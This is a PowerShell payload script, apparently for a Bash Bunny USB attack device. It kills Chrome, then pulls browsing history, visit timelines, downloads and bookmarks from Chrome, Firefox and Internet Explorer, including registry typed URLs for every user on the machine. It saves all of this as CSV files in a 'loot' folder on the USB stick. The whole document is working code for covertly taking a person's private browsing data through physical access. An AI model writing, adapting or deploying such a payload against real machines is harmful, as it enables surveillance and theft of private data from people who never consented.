$date = Get-Date
$date = $date.ToString('').Replace(":",",")
$date = $date.Replace(" ",",")
$date = $date.Replace("/",",")

#Kill chrome process
Stop-Process -Name chrome

#Set the loot directory for bash bunny
$dir = (Get-Volume -FileSystemLabel BashBunny).DriveLetter + ':\loot'
new-item "$($dir)\History-$($date)" -ItemType directory
$dir = "$($dir)\History-$($date)"

#Import pssqlite from bash bunny
Import-Module -Name ((Get-Volume -FileSystemLabel BashBunny).DriveLetter + ':\payloads\switch1\PSSQLite')


#Function to convert from json
function ConvertFrom-Json20([object] $item) {
    Add-Type -AssemblyName System.Web.Extensions
    $ps_js = New-Object System.Web.Script.Serialization.JavaScriptSerializer
    
    return ,$ps_js.DeserializeObject($item)    
}

#GOOGLE CHROME EXTRACTION

#Google chrome directory
$chromeDirectoryPath = "$($env:LOCALAPPDATA)\Google\Chrome\User Data\Default"
$chromeHistoryPath = "$($chromeDirectoryPath)\History"
$chromeBookmarkPath = "$($chromeDirectoryPath)\Bookmarks"

#SQL query to extract data from database file
$chromeHistory = Invoke-SqliteQuery -Query "SELECT url, title FROM urls" -DataSource $chromeHistoryPath
$chromeDownloads = Invoke-SqliteQuery -Query "SELECT tab_url, target_path FROM downloads" -DataSource $chromeHistoryPath
$chromeTimeline = Invoke-SqliteQuery -Query "SELECT url, visit_time FROM visits" -DataSource $chromeHistoryPath

#Write headers to google chrome history, downloads and bookmarks csv
Add-Content -Path "$($dir)\chromeHistory.csv"  -Value '"URL","Title",'
Add-Content -Path "$($dir)\chromeDownloads.csv"  -Value '"Title","Source",'
Add-Content -Path "$($dir)\chromeBookmarks.csv" -Value '"URL","Title",'
Add-Content -Path "$($dir)\chromeTimeline.csv" -Value '"Title","Time","URL",'

$chromeTimeline | ForEach { 
echo $_.visit_time
        $title = Invoke-SqliteQuery -Query "SELECT title, url FROM urls WHERE id='$($_.url)'" -DataSource $chromeHistoryPath
        if($title.title -eq $NULL) {
            continue
        }
        else{
        Add-Content -Path "$($dir)\chromeTimeline.csv" -Value (($title.title.replace(",","")) + ',' + ($_.visit_time.toString()) + ',' + ($title.url))
        }
}

#Write url and title to google chrome history csv
$chromeHistory | ForEach { 
    Add-Content -Path ("$($dir)\chromeHistory.csv") -Value (($_.url.replace(",","")) + ',' + ($_.title.replace(",","")))
}

#Write name and source to google chrome downloads csv
$chromeDownloads | ForEach { 
    $chromeDownloadFileName = $_.target_path.split("\")
    $chromeDownloadFileName = $chromeDownloadFileName[$chromeDownloadFileName.Length-1]
    Add-Content -Path "$($dir)\chromeDownloads.csv" -Value ($chromeDownloadFileName + ',' + $_.tab_url)
}

#Recursive function to get all urls from all folders
function getURLRec([object] $folder) {
    $folder | ForEach {
        if ($_.type -eq "folder") {
            return getURLRec([object] $_.children) 
        }
        else {
            #Write url and title to google chrome bookmarks csv
            Add-Content -Path "$($dir)\chromeBookmarks.csv" -Value (($_.url.replace(",","")) + ',' + ($_.name.replace(",","")))
        }
    }
    return $null 
}

$chromeBookmarkJson = Get-Content $chromeBookmarkPath
$chromeBookmarkOutput = ConvertFrom-Json20($chromeBookmarkJson)

#Traverse through all the folders
$chromeBookmarkOutput.roots | ForEach {
    getUrlRec($_.bookmark_bar.children)
    getUrlRec($_.other.children)
    getUrlRec($_.synced.children)
}

#MOZILLA FIREFOX EXTRACTION

#Mozilla firefox directory
$mozillaDirectoryPath = "$($env:APPDATA)\Mozilla\Firefox\Profiles"

$(Get-ChildItem $mozillaDirectoryPath).FullName | ForEach {
    if (Test-Path "$($_)\places.sqlite") {
        $mozillaPlacesPath = $_ + '\places.sqlite'
    }
}

#SQL query to extract data from database file
$mozillaHistory = Invoke-SqliteQuery -Query "SELECT url, title FROM moz_places" -DataSource $mozillaPlacesPath
$mozillaDownloads = Invoke-SqliteQuery -Query "SELECT content, place_id FROM moz_annos" -DataSource $mozillaPlacesPath
$mozillaBookmarks = Invoke-SqliteQuery -Query "SELECT fk, title FROM moz_bookmarks" -DataSource $mozillaPlacesPath
$mozillaTimeline = Invoke-SqliteQuery -Query "SELECT place_id, visit_date FROM moz_historyvisits" -DataSource $mozillaPlacesPath

#Write headers to mozilla firefox history, downloads and bookmarks csv
Add-Content -Path "$($dir)\mozillaHistory.csv" -Value '"URL","Title",'
Add-Content -Path "$($dir)\mozillaDownloads.csv" -Value '"Title","Source",'
Add-Content -Path "$($dir)\mozillaBookmarks.csv" -Value '"URL","Title",'
Add-Content -Path "$($dir)\mozillaTimeline.csv" -Value '"Title","Time","URL"'

$mozillaTimeline | ForEach {
        $title = Invoke-SqliteQuery -Query "SELECT title, url FROM moz_places WHERE id='$($_.place_id)'" -DataSource $mozillaPlacesPath
        if($title.title -eq $NULL) {
        }
        else{
        $time = $_.visit_date - (9 * 60 * 60 * 1000000)
        Add-Content -Path "$($dir)\mozillaTimeline.csv" -Value (($title.title.replace(",","")) + ',' + ($time.toString()) + ',' + ($title.url))
        }
}

#Write url and title to mozilla firefox history csv
$mozillaHistory | ForEach {
    if($_.title -eq $NULL) {
        Add-Content -Path "$($dir)\mozillaHistory.csv" -Value ($_.url + ',' + $_.title)
    }
    else {
        Add-Content -Path "$($dir)\mozillaHistory.csv" -Value (($_.url.replace(",","")) + ',' + ($_.title.replace(",","")) + ',' + ($_.url))
    }
}

#Write name and source to mozilla firefox downloads csv
$mozillaDownloads | ForEach {
    if($_.content.Contains('{')) {
    }
    else {
        $mozillaDownloadsUrl = Invoke-SqliteQuery -Query "SELECT url FROM moz_places WHERE id='$($_.place_id)'" -DataSource $mozillaPlacesPath
        $mozillaDownloadFileName = $_.content.split("/")
        $mozillaDownloadFileName = $mozillaDownloadFileName[$mozillaDownloadFileName.Length-1]
        Add-Content -Path  "$($dir)\mozillaDownloads.csv" -Value ($mozillaDownloadFileName + ',' + $mozillaDownloadsUrl.url)
    }
}

#Write url and title to mozilla firefox bookmarks csv
$mozillaBookmarks | ForEach {
    if ($_.fk -ne $NULL) {
        $mozillaBookmarksUrl = Invoke-SqliteQuery -Query "SELECT url FROM moz_places where id='$($_.fk)'" -DataSource $mozillaPlacesPath
        Add-Content -Path  "$($dir)\mozillaBookmarks.csv" -Value (($mozillaBookmarksUrl.url.Replace(",","")) + ',' + ($_.title.Replace(",","")))
    }
}

#INTERNET EXPLORER EXTRACTION

#Internet explorer directory
$Null = New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS
$ieHistoryPath = Get-ChildItem 'HKU:\' -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }
$ieBookmarkPath = Get-ChildItem -Path "$Env:systemdrive\Users\" -Filter "*.url" -Recurse -ErrorAction SilentlyContinue

ForEach($Path in $ieHistoryPath) {
    $Path = $Path | Select-Object -ExpandProperty PSPath
    $UserPath = "$Path\Software\Microsoft\Internet Explorer\TypedURLs"
    Get-Item -Path $UserPath -ErrorAction SilentlyContinue | ForEach-Object {
        $Key = $_
        #Write headers to internet explorer history csv
        Add-Content -Path "$($dir)\ieHistory.csv" -Value '"URL",'
        $Key.GetValueNames() | ForEach-Object {
            $Value = $Key.GetValue($_)
            if ($Value -match $Search) {
                #Write url to internet explorer history csv
                Add-Content -Path  "$($dir)\ieHistory.csv" -Value ($Value)
            }
        }          
    }
}

#Write headers to internet explorer bookmarks csv
Add-Content -Path "$($dir)\ieBookmarks.csv" -Value '"URL","Title",'

ForEach ($ieURL in $ieBookmarkPath) {
    if ($ieURL.FullName -match 'Favorites') {
        $ieTitle = $ieURL.FullName.split('\')
        $ieTitle = $ieTitle[$ieTitle.Length - 1].replace(".url","")
        Get-Content -Path $ieURL.FullName | ForEach-Object {
            if ($_.StartsWith('URL')) {
                $ieURL = $_.Substring($_.IndexOf('=') + 1)
                if($ieURL -match $Search) {
                    #Write url and title to internet explorer bookmarks csv
                    Add-Content -Path  "$($dir)\ieBookmarks.csv" -Value (($ieURL.replace(",","")) + ',' + ($ieTitle.replace(",","")))
                }
            }
        }
    }
}